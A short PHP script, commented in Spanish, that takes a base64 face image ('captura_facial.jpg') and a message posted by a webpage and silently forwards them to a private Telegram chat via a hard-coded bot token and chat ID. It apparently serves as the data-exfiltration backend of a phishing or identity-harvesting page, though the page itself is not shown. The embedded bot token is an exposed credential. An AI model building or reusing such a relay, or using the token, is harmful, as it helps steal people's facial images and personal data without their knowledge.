<?php
// telegram-foto.php - Envía fotos y mensajes a Telegram

// Configuración
$BOT_TOKEN = '8885204724:AAH3dmU4W59SlYS5ukE1SiAupUw94tA8PII';
$CHAT_ID = '-5208676950';

// Obtener datos
$mensaje = $_POST['mensaje'] ?? '';
$imagenBase64 = $_POST['imagen'] ?? '';

// Validar que tenemos datos
if (empty($imagenBase64)) {
    exit('No hay imagen');
}

// Extraer la parte de datos de la imagen base64
$imagenData = str_replace('data:image/jpeg;base64,', '', $imagenBase64);
$imagenData = str_replace(' ', '+', $imagenData);
$imagenBinaria = base64_decode($imagenData);

// Guardar imagen temporalmente
$tempFile = tempnam(sys_get_temp_dir(), 'telegram_');
file_put_contents($tempFile, $imagenBinaria);

// Preparar datos para Telegram
if (!empty($mensaje)) {
    // Enviar imagen con mensaje como caption
    $url = "https://api.telegram.org/bot{$BOT_TOKEN}/sendPhoto";
    
    $postData = [
        'chat_id' => $CHAT_ID,
        'caption' => $mensaje,
        'photo' => new CURLFile($tempFile, 'image/jpeg', 'captura_facial.jpg')
    ];
} else {
    // Enviar solo imagen
    $url = "https://api.telegram.org/bot{$BOT_TOKEN}/sendPhoto";
    
    $postData = [
        'chat_id' => $CHAT_ID,
        'photo' => new CURLFile($tempFile, 'image/jpeg', 'captura_facial.jpg')
    ];
}

// Enviar usando cURL
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);

$response = curl_exec($ch);
curl_close($ch);

// Limpiar archivo temporal
unlink($tempFile);

// Responder al JavaScript
echo "OK";
exit;
?>